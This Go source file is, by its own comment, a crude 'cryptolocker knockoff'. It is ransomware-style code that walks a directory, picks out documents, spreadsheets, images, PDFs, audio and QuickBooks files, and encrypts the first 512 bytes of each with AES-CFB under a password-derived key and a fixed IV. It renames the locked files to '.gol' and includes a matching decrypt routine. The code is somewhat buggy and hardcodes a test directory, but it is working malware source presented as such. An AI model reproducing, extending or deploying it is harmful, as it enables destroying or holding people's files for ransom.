//this is a shitty cryptolocker knockoff fail.
package main

import (
    "fmt"
    "os"
    "path/filepath"
    "crypto/aes"
   "crypto/cipher"
   "flag"
)


func main() {
    encPtr := flag.Bool("enc", false, "Use this to encrypt")
    decPtr := flag.Bool("dec", false, "Use this to decrypt")
    dirPtr := flag.String("targetdir", "/tmp/safe/" , "This should be the root of the drive.")
    encPassword := flag.String("password", "secureP@55word!!@!!", "this is the password used. Make it at least 16 chars")
    targetTypes := []string{".qbw", ".doc", ".xls", ".ppt", ".docx", ".xlsx", ".pptx", ".pdf", ".jpg", ".jpeg" , ".JPG", ".png", ".bmp", ".mp3", ".txt"}

    flag.Parse()

    files := []string{}
    if *encPtr == true {
      fmt.Println("Encrypting...")
      files = findFiles("./test_dir/", targetTypes) //target type filtering isn't implemented.
      for _, file := range files {
        for _, ext := range targetTypes { //encrypt only target filetypes
          if filepath.Ext(file) == ext {
            fmt.Println("targeting a ", ext, ":  ", file)
            encryptFile(file, *encPassword)
          }
        // fmt.Println(file)

        }
      }
    }

    if *decPtr == true {
      fmt.Println("Decrypting...")
      files = findFiles("./test_dir/", targetTypes)
      for _, file := range files {
        if filepath.Ext(file) == ".gol" {
          fmt.Println("targeting an encrypted file:  ", file)
          decryptFile(file, *encPassword)
        }
      }
    }

}

func findFiles(path string, targetTypes []string) ([]string) {
  searchDir := "./test_dir/"
  // targetTypes = append(targetTypes, ".xls")
  fileList := []string{}
  err := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
      fileList = append(fileList, path)
      return nil
  })

  if err != nil{
    fmt.Println("error:", err)
  }
  return fileList
}

func decryptFile(file string, password string){
  fs, err := os.OpenFile("./" + file, os.O_RDWR, 777)
  if err != nil{
    fmt.Println("run", err)
  }
  check(err)
  defer fs.Close()

  for len(password) < 16{ // if less than 16 bytes, make it so.
    password += "*"
    fmt.Println("increasing", password)
  }
  block,err := aes.NewCipher([]byte(password[0:16])) //get slice of 16 bytes of password
  if err != nil{
    panic(err)
  }

  ct := []byte("0123456789ABCDEF") //aes-128 is 16 bytes for ct for
  iv := ct[:aes.BlockSize] // this is a const of 16

  size := 512
  buffer := make([]byte, size)
  fs.Seek(0, 0)
  fs.Read(buffer)

  decrypter := cipher.NewCFBDecrypter(block, iv) // simple!

  decrypted := make([]byte, size)
  decrypter.XORKeyStream(decrypted, buffer)

  res, err := fs.WriteAt(decrypted, 0)
  if err != nil {
    fmt.Println(err)
  }
  println(res)
  fs.Sync()
  file = file[0:len(file)-4]
  fmt.Println(file)
  os.Rename("./"+file+".gol", "./"+file)
  return
}

func encryptFile(file string, password string )  {
  // ecrypt the first 512 bytes of this file
  fs, err := os.OpenFile("./" + file, os.O_RDWR, 777)
  if err != nil{
    fmt.Println("run", err)
  }
  check(err)
  defer fs.Close()

  for len(password) < 16{ // if less than 16 bytes, make it so.
    password += "*"
    fmt.Println("increasing", password)
  }

  block,err := aes.NewCipher([]byte(password[0:16])) //get slice of 16 bytes of password
  if err != nil{
    panic(err)
  }

  ct := []byte("0123456789ABCDEF") //aes-128 is 16 bytes for ct for
  iv := ct[:aes.BlockSize] // this is a const of 16

  size := 512
  buffer := make([]byte, size)
  fs.Seek(0, 0)
  fs.Read(buffer)

  // fmt.Println(read, "pass ", password)

  encrypter := cipher.NewCFBEncrypter(block, iv)

  enc := make([]byte, len(buffer))

  encrypter.XORKeyStream(enc, buffer)

  // for idx, _ := range buffer {
  //   buffer[idx] += 1
  // }
  //


  // buffer[0] = 65
  // buffer[1] = 66
  // buffer[2] = 67
  // buffer[3] = 68
  // fmt.Println(buffer)
  res, err := fs.WriteAt(enc, 0)
  if err != nil {
    fmt.Println(err)
  }
  fmt.Println(res)
  fs.Sync()

  os.Rename("./"+file , "./"+file+".gol")
  return
}
func check(e error){
  if e != nil{
    fmt.Println(e)
    panic(e)
  }
}
